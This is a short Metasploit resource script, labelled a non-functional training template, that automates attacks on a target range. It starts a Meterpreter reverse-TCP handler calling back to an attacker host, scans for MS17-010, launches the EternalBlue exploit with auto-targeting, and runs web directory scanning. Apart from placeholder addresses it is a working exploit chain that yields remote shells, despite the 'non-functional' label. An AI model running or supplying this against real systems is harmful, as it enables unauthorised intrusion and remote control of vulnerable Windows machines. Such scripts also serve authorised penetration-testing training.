# Automated Exploitation Template
# For Training Use â€“ Non-functional Template

# Set global variables
setg LHOST <LHOST>
setg LPORT 4444
setg RHOSTS <TARGET_RANGE>

# Start multi-handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT 4444
set ExitOnSession false
exploit -j

# Auto-exploit common vulnerabilities
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_RANGE>
run

use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set AutoTargeting true
exploit -j

# Web application auto-exploit
use auxiliary/scanner/http/dir_scanner
set RHOSTS <TARGET_RANGE>
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run